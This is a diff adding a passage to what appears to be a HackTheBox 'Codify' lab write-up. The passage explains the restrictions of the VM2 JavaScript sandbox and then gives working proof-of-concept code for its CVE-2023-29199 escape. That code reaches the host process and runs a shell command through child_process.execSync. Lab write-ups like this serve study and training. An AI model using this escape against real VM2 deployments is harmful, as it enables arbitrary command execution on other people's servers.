@@ -30,3 +30,24 @@ Searching for information about the website, at "http://codify.htb/about" one di
 VM2 is a JavaScript library used to virtualize a sandbox on a server. In this case, this sandbox is used to run insecure code given by a user in a safe way. For this purpose, VM2 disables some global objects such as process, which allows to obtain information and control the main process.
 
 In addition, developers restricted other modules such as 'child_process' and 'fs'. The child_process module allows to generate threads and thus execute commands on the server, and the fs module allows to interact directly with the file system.
+
+These restrictions can be avoided, as shown in CVE-2023-29199. The following code is used for this purpose:
+
+```JavaScript
+err = {};
+const handler = {
+    getPrototypeOf(target) {
+        (function stack() {
+            new Error().stack;
+            stack();
+        })();
+    }
+};
+  
+const proxiedErr = new Proxy(err, handler);
+try {
+    throw proxiedErr;
+} catch ({constructor: c}) {
+    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
+}
+```
